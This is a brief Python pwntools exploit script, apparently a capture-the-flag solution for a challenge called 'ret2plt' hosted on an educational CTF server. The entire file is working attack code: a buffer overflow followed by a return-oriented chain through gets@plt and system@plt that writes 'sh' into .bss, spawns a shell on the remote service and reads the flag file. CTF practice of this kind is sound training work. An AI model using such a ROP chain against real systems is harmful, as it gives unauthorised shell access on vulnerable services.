'/ Return to function @ .plt section /'
from pwn import *
context(arch = 'amd64', os = 'linux')
r = remote('edu-ctf.csie.org', 10174)
#r = process('./ret2plt')

bss = 0x0000000000601080
pop_rdi = 0x0000000000400733
gets_plt = 0x0000000000400530
system_plt = 0x0000000000400520
ret = 0x000000000040050e

z = flat(
	'A'*0x38,
	pop_rdi,
	bss,
	gets_plt,
	pop_rdi,
	bss,
	system_plt
)
r.sendlineafter(':D', z)
r.sendline('sh')
r.sendline('cat /home/`whoami`/flag')
r.interactive()
